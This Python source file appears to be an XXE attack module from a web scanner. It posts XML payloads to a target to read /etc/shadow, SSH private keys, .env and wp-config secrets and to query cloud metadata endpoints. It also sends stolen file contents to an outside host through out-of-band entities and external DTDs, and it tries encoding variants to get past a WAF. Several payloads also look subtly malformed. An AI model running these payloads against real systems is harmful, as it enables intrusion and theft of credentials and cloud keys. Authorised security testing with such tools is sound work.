"""Deep XXE detection — blind XXE, SSRF-based, OOB, more file paths, encoding bypass."""

import httpx
import urllib.parse
import re
import time
import asyncio

# --- Basic XXE Payloads ---
BASIC_PAYLOADS = [
    ("passwd_read", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', ["root:", "daemon:", "/bin/bash"], "Local file read - /etc/passwd"),
    ("hostname_read", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>', ["localhost", "hostname"], "Local file read - /etc/hostname"),
    ("etc_hosts", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>', ["localhost", "127.0.0.1"], "Local file read - /etc/hosts"),
    ("etc_shadow", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>', ["root:", "$6$", "$1$"], "Local file read - /etc/shadow (CRITICAL)"),
    ("proc_self", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>', ["PATH=", "HOME=", "USER="], "Environment variables leak"),
    ("proc_cmdline", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><root>&xxe;</root>', ["java", "python", "node", "php"], "Process command line leak"),
    ("proc_net", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/net/tcp">]><root>&xxe;</root>', ["00000000", "local_address"], "Network connections leak"),
    ("id_rsa", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><root>&xxe;</root>', ["BEGIN RSA", "BEGIN OPENSSH"], "SSH private key leak (CRITICAL)"),
    ("authorized_keys", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///root/.ssh/authorized_keys">]><root>&xxe;</root>', ["ssh-rsa", "ssh-ed25519"], "SSH authorized keys leak"),
    ("etc_passwd_root", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', ["root:x:0:0"], "Root user entry"),
    ("windows_winini", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>', ["[fonts]", "[extensions]"], "Windows win.ini read"),
    ("windows_sys32", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>', ["localhost", "127.0.0.1"], "Windows hosts file"),
    ("iis_webconfig", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><root>&xxe;</root>', ["connectionString", "appSettings"], "IIS web.config"),
    ("apache_conf", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">]><root>&xxe;</root>', ["ServerRoot", "Listen"], "Apache config"),
    ("nginx_conf", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]><root>&xxe;</root>', ["server {", "listen "], "Nginx config"),
    ("docker_env", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/1/environ">]><root>&xxe;</root>', ["HOME=", "PATH="], "Docker container env"),
    ("docker_cmdline", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/1/cmdline">]><root>&xxe;</root>', ["java", "python", "node"], "Docker container cmdline"),
    ("wp_config", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">]><root>&xxe;</root>', ["DB_NAME", "DB_USER", "DB_PASSWORD"], "WordPress config"),
    ("laravel_env", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]><root>&xxe;</root>', ["APP_KEY=", "DB_PASSWORD=", "MAIL_PASSWORD="], "Laravel .env"),
    ("env_files", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]><root>&xxe;</root>', ["APP_KEY", "SECRET"], "Env file leak"),
]

# --- Blind XXE (OOB via parameter entity) ---
BLIND_PAYLOADS = [
    ("blind_oob_parameter", '<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oob}/xxe_%param%;"> %xxe;]>', "xxe_%param%", "Blind XXE via parameter entity (CRITICAL)"),
    ("blind_oob_element", '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM http://{oob}/%file;"> %eval; %exfil;]>', "", "Blind XXE via element entity"),
    ("blind_cdata", '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<![CDATA[<&#x25; exfil SYSTEM http://{oob}/&#x25;file;>]]>"> %eval; %exfil;]>', "", "Blind XXE via CDATA"),
    ("blind_error_oob", '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM http://{oob}/?data=%file;"> %eval; %error;]>', "", "Blind XXE via error entity"),
]

# --- SSRF-based XXE ---
SSRF_PAYLOADS = [
    ("ssrf_aws", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', ["ami-id", "instance-id", "local-ipv4"], "AWS metadata SSRF"),
    ("ssrf_gcp", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>', ["metadata", "instance"], "GCP metadata SSRF"),
    ("ssrf_azure", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><root>&xxe;</root>', ["compute", "network"], "Azure metadata SSRF"),
    ("ssrf_internal", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>', ["", ""], "Internal SSRF to local services"),
    ("ssrf_internal_6379", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]><root>&xxe;</root>', ["", ""], "Internal SSRF to Redis"),
    ("ssrf_internal_3306", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">]><root>&xxe;</root>', ["", ""], "Internal SSRF to MySQL"),
]

# --- Parameter Entity XXE ---
PARAM_ENTITY_PAYLOADS = [
    ("param_entity_file", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM file:///dev/null"> %eval; %xxe;]><root>&file;</root>', ["root:", "daemon:"], "Parameter entity file read"),
    ("param_entity_oob", '<?xml version="1.0"?>\n<!DOCTYPE root [\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM http://{oob}/?data=%file;">\n%eval;\n%exfil;\n]>\n<root>test</root>', "", "Parameter entity OOB"),
]

# --- DTD Loading ---
DTD_PAYLOADS = [
    ("external_dtd", '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://{oob}/evil.dtd"><root>test</root>', "", "External DTD loading"),
    ("parameter_dtd", '<?xml version="1.0"?>\n<!DOCTYPE root [\n<!ENTITY % dtd SYSTEM "http://{oob}/evil.dtd">\n%dtd;\n]>\n<root>test</root>', "", "Parameter DTD loading"),
]

# --- Encoding Bypass ---
def _xxe_variants(payload: str) -> list[str]:
    """Generate encoding variants for XXE payloads."""
    variants = [payload]

    # UTF-7
    variants.append(payload.replace('<?xml version="1.0"?>', '+ADwAIg-xml version=ACI-1.0ACIAPg-'))

    # UTF-16 BOM
    variants.append(payload.replace('<?xml version="1.0"?>', '\ufeff<?xml version="1.0"?>'))

    # Parameter entity with encoding
    variants.append(payload.replace('SYSTEM', 'SYSTEM'))

    # Case variation
    variants.append(payload.replace('DOCTYPE', 'doctype'))
    variants.append(payload.replace('SYSTEM', 'system'))
    variants.append(payload.replace('ENTITY', 'entity'))

    # CDATA wrapping
    variants.append(payload.replace('<root>', '<root><![CDATA[').replace('</root>', ']]></root>'))

    return list(set(variants))


async def xxe_detect(target: str, oob_domain: str = "") -> dict:
    """Deep XXE detection with blind, SSRF-based, OOB, file reads, encoding bypass."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    results = []
    oob_hits = []
    detected_techniques = set()
    oob_marker = f"xxe_oob_{int(time.time())}"

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # --- Basic XXE (In-Band) ---
        for name, payload, indicators, description in BASIC_PAYLOADS:
            try:
                headers = {"Content-Type": "application/xml"}
                resp = await client.post(target, content=payload, headers=headers)
                body = resp.text

                found = [ind for ind in indicators if ind in body]
                if found:
                    results.append({
                        "technique": "inband_xxe",
                        "payload": name,
                        "indicators": found,
                        "evidence": body[:500] if len(found) > 0 else "",
                        "description": description,
                        "status": resp.status_code,
                        "risk": "CRITICAL" if "ssh" in name or "shadow" in name or "key" in name or "password" in name.lower() else "HIGH",
                        "confidence": "confirmed",
                    })
                    detected_techniques.add("inband_xxe")
            except Exception:
                continue

        # --- SSRF-based XXE ---
        for name, payload, indicators, description in SSRF_PAYLOADS:
            try:
                headers = {"Content-Type": "application/xml"}
                resp = await client.post(target, content=payload, headers=headers)
                body = resp.text

                found = [ind for ind in indicators if ind in body]
                if found:
                    results.append({
                        "technique": "ssrf_xxe",
                        "payload": name,
                        "indicators": found,
                        "description": description,
                        "status": resp.status_code,
                        "risk": "CRITICAL",
                        "confidence": "confirmed",
                    })
                    detected_techniques.add("ssrf_xxe")
            except Exception:
                continue

        # --- Parameter Entity XXE ---
        for name, payload, indicators, description in PARAM_ENTITY_PAYLOADS:
            try:
                headers = {"Content-Type": "application/xml"}
                resp = await client.post(target, content=payload, headers=headers)
                body = resp.text

                found = [ind for ind in indicators if ind in body]
                if found:
                    results.append({
                        "technique": "parameter_entity_xxe",
                        "payload": name,
                        "indicators": found,
                        "description": description,
                        "status": resp.status_code,
                        "risk": "CRITICAL",
                        "confidence": "confirmed",
                    })
                    detected_techniques.add("parameter_entity_xxe")
            except Exception:
                continue

        # --- Blind XXE (OOB) ---
        if oob_domain:
            for name, payload_template, marker, description in BLIND_PAYLOADS:
                try:
                    payload = payload_template.replace("{oob}", oob_domain).replace("{param}", oob_marker)
                    headers = {"Content-Type": "application/xml"}
                    resp = await client.post(target, content=payload, headers=headers)

                    # Check for OOB callback (marker-based)
                    if marker and marker in resp.text:
                        oob_hits.append({
                            "technique": "blind_xxe_oob",
                            "payload": name,
                            "marker": marker,
                            "description": description,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "confirmed",
                        })
                        detected_techniques.add("blind_xxe")
                except Exception:
                    continue

            # External DTD loading
            for name, payload_template, marker, description in DTD_PAYLOADS:
                try:
                    payload = payload_template.replace("{oob}", oob_domain)
                    headers = {"Content-Type": "application/xml"}
                    resp = await client.post(target, content=payload, headers=headers)
                except Exception:
                    continue

        # --- WAF Bypass (Encoding Variants) ---
        if not results:
            for name, payload, indicators, description in BASIC_PAYLOADS[:5]:
                for variant in _xxe_variants(payload)[:3]:
                    try:
                        headers = {"Content-Type": "application/xml"}
                        resp = await client.post(target, content=variant, headers=headers)
                        body = resp.text

                        found = [ind for ind in indicators if ind in body]
                        if found:
                            results.append({
                                "technique": "waf_bypass_xxe",
                                "payload": name,
                                "original": name,
                                "indicators": found,
                                "description": f"WAF bypass: {description}",
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            detected_techniques.add("waf_bypass")
                            break
                    except Exception:
                        continue
                if any(r.get("technique") == "waf_bypass_xxe" for r in results):
                    break

    return {
        "target": target,
        "results": results,
        "oob_hits": oob_hits,
        "vulnerable": len(results) > 0 or len(oob_hits) > 0,
        "total_findings": len(results) + len(oob_hits),
        "techniques_found": list(detected_techniques),
        "risk_summary": {
            "critical": sum(1 for r in results + oob_hits if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results + oob_hits if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results + oob_hits if r.get("risk") == "MEDIUM"),
        },
    }
